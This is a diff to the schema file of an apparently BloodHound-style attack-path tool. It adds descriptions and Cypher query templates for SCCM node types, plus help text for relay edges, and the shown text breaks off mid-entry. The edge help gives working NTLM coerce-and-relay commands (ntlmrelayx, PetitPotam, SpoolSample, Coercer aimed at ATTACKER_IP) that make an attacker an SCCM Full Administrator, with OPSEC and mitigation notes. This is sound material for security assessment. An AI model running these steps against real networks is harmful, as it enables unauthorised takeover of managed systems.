@@ -8,165 +8,1070 @@
   "node_kinds": [
     {
       "name": "SCCM_AdminUser",
-      "display_name": "",
-      "description": "",
+      "display_name": "SCCM Administrative User",
+      "description": "An SCCM administrative record for an Active Directory user or group. Its assigned security roles and collections determine what it can manage.",
       "is_display_kind": true,
       "icon": "user-gear",
-      "color": "#558eea"
+      "color": "#558eea",
+      "info": {
+        "security_roles": {
+          "title": "Security Roles",
+          "position": 1,
+          "markdown": {
+            "content": "{{/* Saved entries are full object IDs, including their hierarchy suffix. */ -}}\n{{ with (.Properties.memberOf | default (list) | compact | uniq | sortAlpha)  -}}\n{{ range $id := . }}{{ if ($id | trim) -}}\n{{ $escapedID := $id | replace \"\\\\\" \"\\\\\\\\\" | replace \"'\" \"\\\\'\" | replace \"\\r\" \"\\\\r\" | replace \"\\n\" \"\\\\n\" | replace \"\\t\" \"\\\\t\"  -}}\n{{ $query := printf \"MATCH (object:SCCM_SecurityRole {objectid: '%s'})\\nRETURN object\" $escapedID  -}}\n[{{ $id | replace \"\\\\\" \"\\\\\\\\\" | replace \"&\" \"&amp;\" | replace \"<\" \"&lt;\" | replace \">\" \"&gt;\" | replace \"|\" \"&#124;\" | replace \"*\" \"\\\\*\" | replace \"_\" \"\\\\_\" | replace \"`\" \"\\\\`\" | replace \"~\" \"\\\\~\" | replace \"[\" \"\\\\[\" | replace \"]\" \"\\\\]\" | replace \"\\r\" \" \" | replace \"\\n\" \" \" | replace \"\\t\" \" \" }}](/ui/explore?exploreSearchTab=cypher&searchType=cypher&cypherSearch={{ $query | b64enc | urlquery }})\n\n{{ end }}{{ end }}{{ end }}\n"
+          }
+        },
+        "collections": {
+          "title": "Collections",
+          "position": 2,
+          "markdown": {
+            "content": "{{/* Saved entries are full object IDs, including their hierarchy suffix. */ -}}\n{{ with (.Properties.collectionIds | default (list) | compact | uniq | sortAlpha)  -}}\n{{ range $id := . }}{{ if ($id | trim) -}}\n{{ $escapedID := $id | replace \"\\\\\" \"\\\\\\\\\" | replace \"'\" \"\\\\'\" | replace \"\\r\" \"\\\\r\" | replace \"\\n\" \"\\\\n\" | replace \"\\t\" \"\\\\t\"  -}}\n{{ $query := printf \"MATCH (object:SCCM_Collection {objectid: '%s'})\\nRETURN object\" $escapedID  -}}\n[{{ $id | replace \"\\\\\" \"\\\\\\\\\" | replace \"&\" \"&amp;\" | replace \"<\" \"&lt;\" | replace \">\" \"&gt;\" | replace \"|\" \"&#124;\" | replace \"*\" \"\\\\*\" | replace \"_\" \"\\\\_\" | replace \"`\" \"\\\\`\" | replace \"~\" \"\\\\~\" | replace \"[\" \"\\\\[\" | replace \"]\" \"\\\\]\" | replace \"\\r\" \" \" | replace \"\\n\" \" \" | replace \"\\t\" \" \" }}](/ui/explore?exploreSearchTab=cypher&searchType=cypher&cypherSearch={{ $query | b64enc | urlquery }})\n\n{{ end }}{{ end }}{{ end }}\n"
+          }
+        },
+        "inbound_object_control": {
+          "title": "Inbound Object Control",
+          "position": 3,
+          "markdown": {
+            "content": "{{ $objectID := .Properties.objectid | default \"\"  -}}\n{{ if ($objectID | trim) -}}\n{{ $escapedID := $objectID | replace \"\\\\\" \"\\\\\\\\\" | replace \"'\" \"\\\\'\" | replace \"\\r\" \"\\\\r\" | replace \"\\n\" \"\\\\n\" | replace \"\\t\" \"\\\\t\"  -}}\n{{ $query := printf \"MATCH path = (object)-[edge]->(selected:SCCM_AdminUser {objectid: '%s'})\\nWHERE type(edge) IN ['AdminTo', 'GenericAll', 'HasSession', 'MSSQL_CoerceAndRelayToMSSQL', 'MSSQL_Contains', 'MSSQL_ControlDB', 'MSSQL_ControlServer', 'MSSQL_ExecuteOnHost', 'MSSQL_GetAdminTGS', 'MSSQL_GetTGS', 'MSSQL_HasLogin', 'MSSQL_HostFor', 'MSSQL_IsMappedTo', 'MSSQL_MemberOf', 'MemberOf', 'SCCM_AdminsReplicatedTo', 'SCCM_AllPermissions', 'SCCM_ApplicationAdministrator', 'SCCM_ApplicationAuthor', 'SCCM_AssignAllPermissions', 'SCCM_CoerceAndRelayToAdminService', 'SCCM_CoerceAndRelayToSMB', 'SCCM_ComplianceSettingsManager', 'SCCM_Contains', 'SCCM_FullAdministrator', 'SCCM_HasADLastLogonUser', 'SCCM_HasClient', 'SCCM_HasCurrentUser', 'SCCM_HasPrimaryUser', 'SCCM_HasStoredAccount', 'SCCM_IsMappedTo', 'SCCM_LocalAdminRequired', 'SCCM_OSDManager', 'SCCM_OperationsAdministrator', 'SCCM_SameHostAs', 'SCCM_SecurityAdministrator']\\nRETURN DISTINCT path\" $escapedID  -}}\n[Show incoming control paths](/ui/explore?exploreSearchTab=cypher&searchType=cypher&cypherSearch={{ $query | b64enc | urlquery }})\n{{ end }}"
+          }
+        },
+        "outbound_object_control": {
+          "title": "Outbound Object Control",
+          "position": 4,
+          "markdown": {
+            "content": "{{ $objectID := .Properties.objectid | default \"\"  -}}\n{{ if ($objectID | trim) -}}\n{{ $escapedID := $objectID | replace \"\\\\\" \"\\\\\\\\\" | replace \"'\" \"\\\\'\" | replace \"\\r\" \"\\\\r\" | replace \"\\n\" \"\\\\n\" | replace \"\\t\" \"\\\\t\"  -}}\n{{ $query := printf \"MATCH path = (selected:SCCM_AdminUser {objectid: '%s'})-[edge]->(object)\\nWHERE type(edge) IN ['AdminTo', 'GenericAll', 'HasSession', 'MSSQL_CoerceAndRelayToMSSQL', 'MSSQL_Contains', 'MSSQL_ControlDB', 'MSSQL_ControlServer', 'MSSQL_ExecuteOnHost', 'MSSQL_GetAdminTGS', 'MSSQL_GetTGS', 'MSSQL_HasLogin', 'MSSQL_HostFor', 'MSSQL_IsMappedTo', 'MSSQL_MemberOf', 'MemberOf', 'SCCM_AdminsReplicatedTo', 'SCCM_AllPermissions', 'SCCM_ApplicationAdministrator', 'SCCM_ApplicationAuthor', 'SCCM_AssignAllPermissions', 'SCCM_CoerceAndRelayToAdminService', 'SCCM_CoerceAndRelayToSMB', 'SCCM_ComplianceSettingsManager', 'SCCM_Contains', 'SCCM_FullAdministrator', 'SCCM_HasADLastLogonUser', 'SCCM_HasClient', 'SCCM_HasCurrentUser', 'SCCM_HasPrimaryUser', 'SCCM_HasStoredAccount', 'SCCM_IsMappedTo', 'SCCM_LocalAdminRequired', 'SCCM_OSDManager', 'SCCM_OperationsAdministrator', 'SCCM_SameHostAs', 'SCCM_SecurityAdministrator']\\nRETURN DISTINCT path\" $escapedID  -}}\n[Show outgoing control paths](/ui/explore?exploreSearchTab=cypher&searchType=cypher&cypherSearch={{ $query | b64enc | urlquery }})\n{{ end }}"
+          }
+        }
+      }
     },
     {
       "name": "SCCM_ClientDevice",
-      "display_name": "",
-      "description": "",
+      "display_name": "SCCM Client Device",
+      "description": "A device confirmed or inferred to be managed by SCCM, with its site, collection memberships, and associated users.",
       "is_display_kind": true,
       "icon": "desktop",
-      "color": "#f59b42"
+      "color": "#f59b42",
+      "info": {
+        "member_of_collections": {
+          "title": "Member of Collections",
+          "position": 1,
+          "markdown": {
+            "content": "{{/* Saved array entries supply the rows; lookups run only after a click. */ -}}\n{{ $hasRows := false -}}\n{{ range $id := (.Properties.collectionIds | default (list) | compact | uniq | sortAlpha) -}}\n{{ if ($id | trim) -}}\n{{ $escapedID := $id | replace \"\\\\\" \"\\\\\\\\\" | replace \"'\" \"\\\\'\" | replace \"\\r\" \"\\\\r\" | replace \"\\n\" \"\\\\n\" | replace \"\\t\" \"\\\\t\"  -}}\n{{ $query := printf \"MATCH (object:SCCM_Collection {objectid: '%s'})\\nRETURN object\" $escapedID -}}\n{{ if not $hasRows -}}\n|  |\n| --- |\n{{ $hasRows = true -}}\n{{ end -}}\n| [{{ $id | replace \"\\\\\" \"\\\\\\\\\" | replace \"&\" \"&amp;\" | replace \"<\" \"&lt;\" | replace \">\" \"&gt;\" | replace \"|\" \"&#124;\" | replace \"*\" \"\\\\*\" | replace \"_\" \"\\\\_\" | replace \"`\" \"\\\\`\" | replace \"~\" \"\\\\~\" | replace \"[\" \"\\\\[\" | replace \"]\" \"\\\\]\" | replace \"\\r\" \" \" | replace \"\\n\" \" \" | replace \"\\t\" \" \" }}](/ui/explore?exploreSearchTab=cypher&searchType=cypher&cypherSearch={{ $query | b64enc | urlquery }}) |\n{{ end -}}\n{{ end }}\n"
+          }
+        },
+        "inbound_object_control": {
+          "title": "Inbound Object Control",
+          "position": 2,
+          "markdown": {
+            "content": "{{ $objectID := .Properties.objectid | default \"\"  -}}\n{{ if ($objectID | trim) -}}\n{{ $escapedID := $objectID | replace \"\\\\\" \"\\\\\\\\\" | replace \"'\" \"\\\\'\" | replace \"\\r\" \"\\\\r\" | replace \"\\n\" \"\\\\n\" | replace \"\\t\" \"\\\\t\"  -}}\n{{ $query := printf \"MATCH path = (object)-[edge]->(selected:SCCM_ClientDevice {objectid: '%s'})\\nWHERE type(edge) IN ['AdminTo', 'GenericAll', 'HasSession', 'MSSQL_CoerceAndRelayToMSSQL', 'MSSQL_Contains', 'MSSQL_ControlDB', 'MSSQL_ControlServer', 'MSSQL_ExecuteOnHost', 'MSSQL_GetAdminTGS', 'MSSQL_GetTGS', 'MSSQL_HasLogin', 'MSSQL_HostFor', 'MSSQL_IsMappedTo', 'MSSQL_MemberOf', 'MemberOf', 'SCCM_AdminsReplicatedTo', 'SCCM_AllPermissions', 'SCCM_ApplicationAdministrator', 'SCCM_ApplicationAuthor', 'SCCM_AssignAllPermissions', 'SCCM_CoerceAndRelayToAdminService', 'SCCM_CoerceAndRelayToSMB', 'SCCM_ComplianceSettingsManager', 'SCCM_Contains', 'SCCM_FullAdministrator', 'SCCM_HasADLastLogonUser', 'SCCM_HasClient', 'SCCM_HasCurrentUser', 'SCCM_HasPrimaryUser', 'SCCM_HasStoredAccount', 'SCCM_IsMappedTo', 'SCCM_LocalAdminRequired', 'SCCM_OSDManager', 'SCCM_OperationsAdministrator', 'SCCM_SameHostAs', 'SCCM_SecurityAdministrator']\\nRETURN DISTINCT path\" $escapedID  -}}\n[Show incoming control paths](/ui/explore?exploreSearchTab=cypher&searchType=cypher&cypherSearch={{ $query | b64enc | urlquery }})\n{{ end }}"
+          }
+        },
+        "outbound_object_control": {
+          "title": "Outbound Object Control",
+          "position": 3,
+          "markdown": {
+            "content": "{{ $objectID := .Properties.objectid | default \"\"  -}}\n{{ if ($objectID | trim) -}}\n{{ $escapedID := $objectID | replace \"\\\\\" \"\\\\\\\\\" | replace \"'\" \"\\\\'\" | replace \"\\r\" \"\\\\r\" | replace \"\\n\" \"\\\\n\" | replace \"\\t\" \"\\\\t\"  -}}\n{{ $query := printf \"MATCH path = (selected:SCCM_ClientDevice {objectid: '%s'})-[edge]->(object)\\nWHERE type(edge) IN ['AdminTo', 'GenericAll', 'HasSession', 'MSSQL_CoerceAndRelayToMSSQL', 'MSSQL_Contains', 'MSSQL_ControlDB', 'MSSQL_ControlServer', 'MSSQL_ExecuteOnHost', 'MSSQL_GetAdminTGS', 'MSSQL_GetTGS', 'MSSQL_HasLogin', 'MSSQL_HostFor', 'MSSQL_IsMappedTo', 'MSSQL_MemberOf', 'MemberOf', 'SCCM_AdminsReplicatedTo', 'SCCM_AllPermissions', 'SCCM_ApplicationAdministrator', 'SCCM_ApplicationAuthor', 'SCCM_AssignAllPermissions', 'SCCM_CoerceAndRelayToAdminService', 'SCCM_CoerceAndRelayToSMB', 'SCCM_ComplianceSettingsManager', 'SCCM_Contains', 'SCCM_FullAdministrator', 'SCCM_HasADLastLogonUser', 'SCCM_HasClient', 'SCCM_HasCurrentUser', 'SCCM_HasPrimaryUser', 'SCCM_HasStoredAccount', 'SCCM_IsMappedTo', 'SCCM_LocalAdminRequired', 'SCCM_OSDManager', 'SCCM_OperationsAdministrator', 'SCCM_SameHostAs', 'SCCM_SecurityAdministrator']\\nRETURN DISTINCT path\" $escapedID  -}}\n[Show outgoing control paths](/ui/explore?exploreSearchTab=cypher&searchType=cypher&cypherSearch={{ $query | b64enc | urlquery }})\n{{ end }}"
+          }
+        }
+      }
     },
     {
       "name": "SCCM_Collection",
-      "display_name": "",
-      "description": "",
+      "display_name": "SCCM Collection",
+      "description": "A group of devices or users used to organize SCCM management, target deployments, and define administrative access.",
       "is_display_kind": true,
       "icon": "sitemap",
-      "color": "#fff82e"
+      "color": "#fff82e",
+      "info": {
+        "members": {
+          "title": "Members",
+          "position": 1,
+          "markdown": {
+            "content": "{{/* Saved array entries supply the rows; lookups run only after a click. */ -}}\n{{ $hasRows := false -}}\n{{ range $id := (.Properties.members | default (list) | compact | uniq | sortAlpha) -}}\n{{ if ($id | trim) -}}\n{{ $escapedID := $id | replace \"\\\\\" \"\\\\\\\\\" | replace \"'\" \"\\\\'\" | replace \"\\r\" \"\\\\r\" | replace \"\\n\" \"\\\\n\" | replace \"\\t\" \"\\\\t\"  -}}\n{{ $query := printf \"MATCH (object)\\nWHERE (object:SCCM_ClientDevice AND object.resourceID = '%s')\\n   OR ((object:User OR object:Group) AND '%s' IN object.SCCMResourceIDs)\\nRETURN DISTINCT object\" $escapedID $escapedID -}}\n{{ if not $hasRows -}}\n|  |\n| --- |\n{{ $hasRows = true -}}\n{{ end -}}\n| [{{ $id | replace \"\\\\\" \"\\\\\\\\\" | replace \"&\" \"&amp;\" | replace \"<\" \"&lt;\" | replace \">\" \"&gt;\" | replace \"|\" \"&#124;\" | replace \"*\" \"\\\\*\" | replace \"_\" \"\\\\_\" | replace \"`\" \"\\\\`\" | replace \"~\" \"\\\\~\" | replace \"[\" \"\\\\[\" | replace \"]\" \"\\\\]\" | replace \"\\r\" \" \" | replace \"\\n\" \" \" | replace \"\\t\" \" \" }}](/ui/explore?exploreSearchTab=cypher&searchType=cypher&cypherSearch={{ $query | b64enc | urlquery }}) |\n{{ end -}}\n{{ end }}\n"
+          }
+        },
+        "collection_assignments": {
+          "title": "Collection Assignments",
+          "position": 2,
+          "markdown": {
+            "content": "{{/* Collections do not store administrator lists; these links query their saved collectionIds. */ -}}\n{{ $id := .Properties.objectid | default \"\" -}}\n{{ if ($id | trim) -}}\n{{ $escapedID := $id | replace \"\\\\\" \"\\\\\\\\\" | replace \"'\" \"\\\\'\" | replace \"\\r\" \"\\\\r\" | replace \"\\n\" \"\\\\n\" | replace \"\\t\" \"\\\\t\"  -}}\n{{ $query := printf \"MATCH (admin:SCCM_AdminUser)\\nWHERE '%s' IN admin.collectionIds\\nRETURN DISTINCT admin\" $escapedID -}}\n{{ $identityQuery := printf \"MATCH (admin:SCCM_AdminUser), (identity:Base)\\nWHERE '%s' IN admin.collectionIds\\n  AND identity.objectid = admin.adminSid\\nRETURN DISTINCT identity\" $escapedID -}}\n| SCCM Administrators | AD Identities |\n| --- | --- |\n| [Show assigned administrators](/ui/explore?exploreSearchTab=cypher&searchType=cypher&cypherSearch={{ $query | b64enc | urlquery }}) | [Show AD identities](/ui/explore?exploreSearchTab=cypher&searchType=cypher&cypherSearch={{ $identityQuery | b64enc | urlquery }}) |\n{{ end }}\n"
+          }
+        }
+      }
     },
     {
       "name": "SCCM_SecurityRole",
-      "display_name": "",
-      "description": "",
+      "display_name": "SCCM Security Role",
+      "description": "A built-in or custom set of SCCM administrative permissions. Assigned roles define which actions an administrative user can perform against assigned collections and security scopes.",
       "is_display_kind": true,
       "icon": "users-gear",
-      "color": "#9852ed"
+      "color": "#9852ed",
+      "info": {
+        "role_assignments": {
+          "title": "Role Assignments",
+          "position": 1,
+          "markdown": {
+            "content": "{{/* Saved array entries supply the rows; lookups run only after a click. */ -}}\n{{ $hasRows := false -}}\n{{ range $id := (.Properties.members | default (list) | compact | uniq | sortAlpha) -}}\n{{ if ($id | trim) -}}\n{{ $escapedID := $id | replace \"\\\\\" \"\\\\\\\\\" | replace \"'\" \"\\\\'\" | replace \"\\r\" \"\\\\r\" | replace \"\\n\" \"\\\\n\" | replace \"\\t\" \"\\\\t\"  -}}\n{{ $query := printf \"MATCH (object:SCCM_AdminUser {objectid: '%s'})\\nRETURN object\" $escapedID -}}\n{{ $identityQuery := printf \"MATCH (admin:SCCM_AdminUser {objectid: '%s'})\\nMATCH (identity:Base)\\nWHERE identity.objectid = admin.adminSid\\nRETURN DISTINCT identity\" $escapedID -}}\n{{ if not $hasRows -}}\n| SCCM Administrator | AD Identity |\n| --- | --- |\n{{ $hasRows = true -}}\n{{ end -}}\n| [{{ $id | replace \"\\\\\" \"\\\\\\\\\" | replace \"&\" \"&amp;\" | replace \"<\" \"&lt;\" | replace \">\" \"&gt;\" | replace \"|\" \"&#124;\" | replace \"*\" \"\\\\*\" | replace \"_\" \"\\\\_\" | replace \"`\" \"\\\\`\" | replace \"~\" \"\\\\~\" | replace \"[\" \"\\\\[\" | replace \"]\" \"\\\\]\" | replace \"\\r\" \" \" | replace \"\\n\" \" \" | replace \"\\t\" \" \" }}](/ui/explore?exploreSearchTab=cypher&searchType=cypher&cypherSearch={{ $query | b64enc | urlquery }}) | [AD identity](/ui/explore?exploreSearchTab=cypher&searchType=cypher&cypherSearch={{ $identityQuery | b64enc | urlquery }}) |\n{{ end -}}\n{{ end }}\n"
+          }
+        }
+      }
     },
     {
       "name": "SCCM_Site",
-      "display_name": "",
-      "description": "",
+      "display_name": "SCCM Site",
+      "description": "A central administration, primary, or secondary site within an SCCM hierarchy, with its associated servers, database, and management configuration.",
       "is_display_kind": true,
       "icon": "city",
-      "color": "#67ebf0"
+      "color": "#67ebf0",
+      "info": {
+        "administrative_users": {
+          "title": "Administrative Users",
+          "position": 1,
+          "markdown": {
+            "content": "{{ $root := .Properties.rootSiteCode | default .Properties.environmentid | default \"\" | trim  -}}\n{{ with (.Properties.adminUsers | default (list) | compact | uniq | sortAlpha)  -}}\n{{ range . }}{{ $id := . | trim }}{{ if $id  -}}\n{{ $name := $id | trimSuffix (printf \"@%s\" $root)  -}}\n{{ $escapedID := $id | replace \"\\\\\" \"\\\\\\\\\" | replace \"'\" \"\\\\'\" | replace \"\\r\" \"\\\\r\" | replace \"\\n\" \"\\\\n\" | replace \"\\t\" \"\\\\t\"  -}}\n{{ $query := printf \"MATCH (object:SCCM_AdminUser {objectid: '%s'})\\nRETURN object\" $escapedID  -}}\n[{{ $name | replace \"\\\\\" \"\\\\\\\\\" | replace \"&\" \"&amp;\" | replace \"<\" \"&lt;\" | replace \">\" \"&gt;\" | replace \"|\" \"&#124;\" | replace \"*\" \"\\\\*\" | replace \"_\" \"\\\\_\" | replace \"`\" \"\\\\`\" | replace \"~\" \"\\\\~\" | replace \"[\" \"\\\\[\" | replace \"]\" \"\\\\]\" | replace \"\\r\" \" \" | replace \"\\n\" \" \" | replace \"\\t\" \" \" }}](/ui/explore?exploreSearchTab=cypher&searchType=cypher&cypherSearch={{ $query | b64enc | urlquery }})\n\n{{ end }}{{ end }}{{ end }}"
+          }
+        },
+        "site_system_roles": {
+          "title": "Site System Roles",
+          "position": 2,
+          "markdown": {
+            "content": "{{/* Each saved entry is hostname: role@site. Split it using JSON helpers because split is not supported. */ -}}\n{{ $hostsJSON := \"[\"  -}}\n{{ range (.Properties.siteSystemRoles | default (list)) }}{{ if contains \": \" .  -}}\n{{ $parts := printf \"[%s]\" (. | toJson | replace \": \" \"\\\",\\\"\") | fromJson  -}}\n{{ $host := first $parts | trim | upper  -}}\n{{ $role := rest $parts | join \": \" | trim | upper  -}}\n{{ if and $host (not (hasPrefix \"SMS SITE SYSTEM@\" $role)) (not (hasPrefix \"SMS COMPONENT SERVER@\" $role))  -}}\n{{/* Quote each hostname before building the list, so punctuation stays inside its JSON string. */ -}}\n{{ $hostsJSON = printf \"%s%s,\" $hostsJSON ($host | toJson)  -}}\n{{ end }}{{ end }}{{ end  -}}\n{{ $hostsJSON = printf \"%s]\" ($hostsJSON | trimSuffix \",\")  -}}\n{{ with ($hostsJSON | fromJson | uniq | sortAlpha)  -}}\n{{ range .  -}}\n{{ $escapedHost := . | replace \"\\\\\" \"\\\\\\\\\" | replace \"'\" \"\\\\'\" | replace \"\\r\" \"\\\\r\" | replace \"\\n\" \"\\\\n\" | replace \"\\t\" \"\\\\t\"  -}}\n{{ $query := printf \"MATCH (object:Computer)\\nWHERE toUpper(object.name) = '%s' OR toUpper(object.dNSHostName) = '%s'\\nRETURN DISTINCT object\" $escapedHost $escapedHost  -}}\n[{{ . | replace \"\\\\\" \"\\\\\\\\\" | replace \"&\" \"&amp;\" | replace \"<\" \"&lt;\" | replace \">\" \"&gt;\" | replace \"|\" \"&#124;\" | replace \"*\" \"\\\\*\" | replace \"_\" \"\\\\_\" | replace \"`\" \"\\\\`\" | replace \"~\" \"\\\\~\" | replace \"[\" \"\\\\[\" | replace \"]\" \"\\\\]\" | replace \"\\r\" \" \" | replace \"\\n\" \" \" | replace \"\\t\" \" \" }}](/ui/explore?exploreSearchTab=cypher&searchType=cypher&cypherSearch={{ $query | b64enc | urlquery }})\n\n{{ end }}{{ end }}"
+          }
+        },
+        "inbound_object_control": {
+          "title": "Inbound Object Control",
+          "position": 3,
+          "markdown": {
+            "content": "{{ $objectID := .Properties.objectid | default .Properties.siteCode | default \"\" | trim  -}}\n{{ if $objectID  -}}\n{{ $escapedID := $objectID | replace \"\\\\\" \"\\\\\\\\\" | replace \"'\" \"\\\\'\" | replace \"\\r\" \"\\\\r\" | replace \"\\n\" \"\\\\n\" | replace \"\\t\" \"\\\\t\"  -}}\n{{ $query := printf \"MATCH path = (object)-[edge]->(selected:SCCM_Site {objectid: '%s'})\\nWHERE type(edge) IN ['AdminTo', 'GenericAll', 'HasSession', 'MSSQL_CoerceAndRelayToMSSQL', 'MSSQL_Contains', 'MSSQL_ControlDB', 'MSSQL_ControlServer', 'MSSQL_ExecuteOnHost', 'MSSQL_GetAdminTGS', 'MSSQL_GetTGS', 'MSSQL_HasLogin', 'MSSQL_HostFor', 'MSSQL_IsMappedTo', 'MSSQL_MemberOf', 'MemberOf', 'SCCM_AdminsReplicatedTo', 'SCCM_AllPermissions', 'SCCM_ApplicationAdministrator', 'SCCM_ApplicationAuthor', 'SCCM_AssignAllPermissions', 'SCCM_CoerceAndRelayToAdminService', 'SCCM_CoerceAndRelayToSMB', 'SCCM_ComplianceSettingsManager', 'SCCM_Contains', 'SCCM_FullAdministrator', 'SCCM_HasADLastLogonUser', 'SCCM_HasClient', 'SCCM_HasCurrentUser', 'SCCM_HasPrimaryUser', 'SCCM_HasStoredAccount', 'SCCM_IsMappedTo', 'SCCM_LocalAdminRequired', 'SCCM_OSDManager', 'SCCM_OperationsAdministrator', 'SCCM_SameHostAs', 'SCCM_SecurityAdministrator']\\nRETURN DISTINCT path\" $escapedID  -}}\n[Show incoming control paths](/ui/explore?exploreSearchTab=cypher&searchType=cypher&cypherSearch={{ $query | b64enc | urlquery }})\n{{ end }}"
+          }
+        },
+        "outbound_object_control": {
+          "title": "Outbound Object Control",
+          "position": 4,
+          "markdown": {
+            "content": "{{ $objectID := .Properties.objectid | default .Properties.siteCode | default \"\" | trim  -}}\n{{ if $objectID  -}}\n{{ $escapedID := $objectID | replace \"\\\\\" \"\\\\\\\\\" | replace \"'\" \"\\\\'\" | replace \"\\r\" \"\\\\r\" | replace \"\\n\" \"\\\\n\" | replace \"\\t\" \"\\\\t\"  -}}\n{{ $query := printf \"MATCH path = (selected:SCCM_Site {objectid: '%s'})-[edge]->(object)\\nWHERE type(edge) IN ['AdminTo', 'GenericAll', 'HasSession', 'MSSQL_CoerceAndRelayToMSSQL', 'MSSQL_Contains', 'MSSQL_ControlDB', 'MSSQL_ControlServer', 'MSSQL_ExecuteOnHost', 'MSSQL_GetAdminTGS', 'MSSQL_GetTGS', 'MSSQL_HasLogin', 'MSSQL_HostFor', 'MSSQL_IsMappedTo', 'MSSQL_MemberOf', 'MemberOf', 'SCCM_AdminsReplicatedTo', 'SCCM_AllPermissions', 'SCCM_ApplicationAdministrator', 'SCCM_ApplicationAuthor', 'SCCM_AssignAllPermissions', 'SCCM_CoerceAndRelayToAdminService', 'SCCM_CoerceAndRelayToSMB', 'SCCM_ComplianceSettingsManager', 'SCCM_Contains', 'SCCM_FullAdministrator', 'SCCM_HasADLastLogonUser', 'SCCM_HasClient', 'SCCM_HasCurrentUser', 'SCCM_HasPrimaryUser', 'SCCM_HasStoredAccount', 'SCCM_IsMappedTo', 'SCCM_LocalAdminRequired', 'SCCM_OSDManager', 'SCCM_OperationsAdministrator', 'SCCM_SameHostAs', 'SCCM_SecurityAdministrator']\\nRETURN DISTINCT path\" $escapedID  -}}\n[Show outgoing control paths](/ui/explore?exploreSearchTab=cypher&searchType=cypher&cypherSearch={{ $query | b64enc | urlquery }})\n{{ end }}"
+          }
+        }
+      }
     }
   ],
   "relationship_kinds": [
     {
       "name": "SCCM_CoerceAndRelayToAdminService",
-      "description": "",
-      "is_traversable": true
+      "description": "An authenticated domain user can coerce authentication from a site server and relay it to an SMS Provider’s AdminService to gain SCCM administrative access.",
+      "is_traversable": true,
+      "info": {
+        "general": {
+          "title": "General",
+          "position": 1,
+          "markdown": {
+            "content": "A Site Server can be coerced into authenticating to an SMS Provider whose AdminService accepts NTLM (inbound NTLM is not restricted), allowing the coerced authentication to be relayed to the AdminService to gain administrative control of the site. This is a possible edge, emitted when the relay target's inbound NTLM restriction is unset or 'Off'. The source is the Authenticated Users principal of the site server's domain, and the target is the SCCM site. Note: starting with Configuration Manager version 2509, the AdminService rejects NTLM authentication, which breaks this relay path. The relay target's NTLM-restriction state is read directly from its registry when RemoteRegistry access is available, rather than assumed off by default, so this edge only appears when that setting was actually observed unset or 'Off'."
+          }
+        },
+        "windows_abuse": {
+          "title": "Windows Abuse",
+          "position": 2,
+          "markdown": {
+            "content": "Coerce and relay authentication to the SMS Provider's AdminService. AdminService relay is NOT in mainline Impacket; until it is merged, use Garrett Foster's (unsigned_sh0rt) fork / pull request #1593, which adds the `--adminservice` flag.\n\n### Step 1: Set up the (forked) NTLM relay to add your account as a Full Administrator\n\n```text\nntlmrelayx.py --adminservice --logonname '<attacker_domain>\\<attacker>' --displayname '<attacker_domain>\\<attacker>' --objectsid <attacker_sid> -smb2support -t https://<sms_provider_fqdn>/AdminService/wmi/SMS_Admin\n```\n\n### Step 2: Trigger authentication from the Site Server using:\n\n- PrinterBug/SpoolSample\n\n```text\nSpoolSample.exe SITE_SERVER ATTACKER_IP\n```\n\n- PetitPotam\n\n```text\nPetitPotam.exe ATTACKER_IP SITE_SERVER\n```\n\n- Coercer\n\n```text\ncoercer.py coerce -u '' -p '' -t SITE_SERVER -l ATTACKER_IP\n```\n\n### Step 3: The relayed site server authentication adds your account (the supplied SID)\n\nas an SCCM Full Administrator, granting control of the hierarchy.\n\nSee the Misconfiguration Manager TAKEOVER-5 technique in the References section."
+          }
+        },
+        "linux_abuse": {
+          "title": "Linux Abuse",
+          "position": 3,
+          "markdown": {
+            "content": "Coerce and relay authentication to the SMS Provider's AdminService. AdminService relay is NOT in mainline Impacket; until it is merged, use Garrett Foster's (unsigned_sh0rt) fork / pull request #1593, which adds the `--adminservice` flag.\n\n### Step 1: Set up the (forked) NTLM relay to add your account as a Full Administrator\n\n```text\nntlmrelayx.py --adminservice --logonname '<attacker_domain>\\<attacker>' --displayname '<attacker_domain>\\<attacker>' --objectsid <attacker_sid> -smb2support -t https://<sms_provider_fqdn>/AdminService/wmi/SMS_Admin\n```\n\n### Step 2: Trigger authentication from the Site Server using:\n\n- PetitPotam (unauthenticated)\n\n```text\npython3 PetitPotam.py ATTACKER_IP SITE_SERVER\n```\n\n- Coercer\n\n```text\ncoercer.py coerce -u '' -p '' -t SITE_SERVER -l ATTACKER_IP\n```\n\n- PrinterBug via Wine\n\n```text\nwine SpoolSample.exe SITE_SERVER ATTACKER_IP\n```\n\n### Step 3: The relayed site server authentication adds your account (the supplied SID)\n\nas an SCCM Full Administrator, granting control of the hierarchy.\n\nSee the Misconfiguration Manager TAKEOVER-5 technique in the References section."
+          }
+        },
+        "opsec": {
+          "title": "Operational Security",
+          "position": 4,
+          "markdown": {
+            "content": "Coercion methods may generate logon events on the target system (Event ID 4624/4625). Actions performed through the AdminService are written to the SCCM diagnostic logs, though these are rarely forwarded to a SIEM. This is a possible edge: it is emitted when the relay target's inbound NTLM restriction is unset or 'Off'. Restricting inbound NTLM on the SMS Provider prevents this attack. Additionally, Configuration Manager version 2509 and later reject NTLM at the AdminService, which breaks this relay path entirely."
+          }
+        },
+        "references": {
+          "title": "References",
+          "position": 5,
+          "markdown": {
+            "content": "- [https://github.com/subat0mik/Misconfiguration-Manager/blob/main/attack-techniques/TAKEOVER/TAKEOVER-5/takeover-5_description.md](https://github.com/subat0mik/Misconfiguration-Manager/blob/main/attack-techniques/TAKEOVER/TAKEOVER-5/takeover-5_description.md)\n- [https://github.com/fortra/impacket/pull/1593](https://github.com/fortra/impacket/pull/1593)\n- [https://github.com/topotam/PetitPotam](https://github.com/topotam/PetitPotam)\n- [https://github.com/p0dalirius/Coercer](https://github.com/p0dalirius/Coercer)\n- [https://github.com/Mayyhem/SharpSCCM/wiki](https://github.com/Mayyhem/SharpSCCM/wiki)\n- [https://learn.microsoft.com/en-us/intune/configmgr/core/plan-design/hierarchy/log-files](https://learn.microsoft.com/en-us/intune/configmgr/core/plan-design/hierarchy/log-files)"
+          }
+        }
+      }
     },
     {
       "name": "SCCM_CoerceAndRelayToSMB",
-      "description": "",
-      "is_traversable": true
+      "description": "An authenticated domain user can coerce authentication from a site server and relay it to the destination computer over SMB to gain code execution with SYSTEM privileges.",
+      "is_traversable": true,
+      "info": {
+        "general": {
+          "title": "General",
+          "position": 1,
+          "markdown": {
